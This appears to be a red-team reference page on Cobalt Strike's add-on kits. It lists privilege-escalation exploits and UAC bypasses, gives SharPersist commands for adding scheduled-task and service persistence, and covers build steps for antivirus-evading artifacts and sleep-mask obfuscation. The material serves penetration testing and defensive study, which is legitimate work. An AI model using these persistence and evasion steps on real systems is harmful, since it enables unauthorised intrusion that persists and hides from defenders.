# Cobalt Strike - Kits

* [Cobalt Strike Community Kit](https://cobalt-strike.github.io/community_kit/) - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike

## Elevate Kit

UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018)

```powershell
beacon> runasadmin

Beacon Command Elevators
========================

    Exploit                         Description
    -------                         -----------
    ms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)
    ms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)
    ms16-016                        mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)
    svc-exe                         Get SYSTEM via an executable run as a service
    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
    uac-token-duplication           Bypass UAC with Token Duplication
```

## Persistence Kit

* https://github.com/0xthirteen/MoveKit
* https://github.com/fireeye/SharPersist
    ```powershell
    # List persistences
    SharPersist -t schtaskbackdoor -m list
    SharPersist -t startupfolder -m list
    SharPersist -t schtask -m list

    # Add a persistence
    SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
    SharPersist -t schtaskbackdoor -n "Something Cool" -m remove

    SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
    SharPersist -t service -n "Some Service" -m remove

    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
    SharPersist -t schtask -n "Some Task" -m remove
    ```


## Resource Kit

> The Resource Kit is Cobalt Strike's means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows


## Artifact Kit

> Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -> Script Manager, and load the artifact.cna script from that technique's folder.

Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :

- Download the artifact kit : `Go to Help -> Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike)`
- Install the dependencies : `sudo apt-get install mingw-w64`
- Edit the Artifact code
    * Change pipename strings
    * Change `VirtualAlloc` in `patch.c`/`patch.exe`, e.g: HeapAlloc
    * Change Import
- Build the Artifact
- Cobalt Strike -> Script Manager > Load .cna


## Mimikatz Kit

* Download and extract the .tgz from the Arsenal
* Load the mimikatz.cna aggressor script
* Use mimikatz functions as normal


## Sleep Mask Kit

> The Sleep Mask Kit is the source code for the sleep mask function that is executed to obfuscate Beacon, in memory, prior to sleeping.

Use the included `build.sh` or `build.bat` script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.


## Mutator Kit

> The Mutator Kit, introduced by Cobalt Strike, is a tool designed to create uniquely mutated versions of a "sleep mask" used in payloads to evade detection by static signatures. It utilizes LLVM obfuscation techniques to alter the sleep mask, making it difficult for memory scanning tools to identify the mask based on predefined patterns, thereby enhancing operational security for red team activities.

The OBFUSCATIONS variable can be `flattening`,`substitution`,`split-basic-blocks`,`bogus`.

```ps1
OBFUSCATIONS=substitution mutator.sh x64 -emit-llvm -S example.c -o example_with_substitutions.ll
mutator.sh x64 -c -DIMPL_CHKSTK_MS=1 -DMASK_TEXT_SECTION=1 -o sleepmask.x64.o src49/sleepmask.c
```


## Thread Stack Spoofer

> An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory examination rules and better hide shellcodes while in-process memory.

Thread Stack Spoofer is now enabled by default in the Artifact Kit, it is possible to disable it via the option `artifactkit_stack_spoof` in the config file `arsenal_kit.config`.


## References

* [Introducing the Mutator Kit: Creating Object File Monstrosities with Sleep Mask and LLVM - @joehowwolf @HenriNurmi](https://www.cobaltstrike.com/blog/introducing-the-mutator-kit-creating-object-file-monstrosities-with-sleep-mask-and-llvm)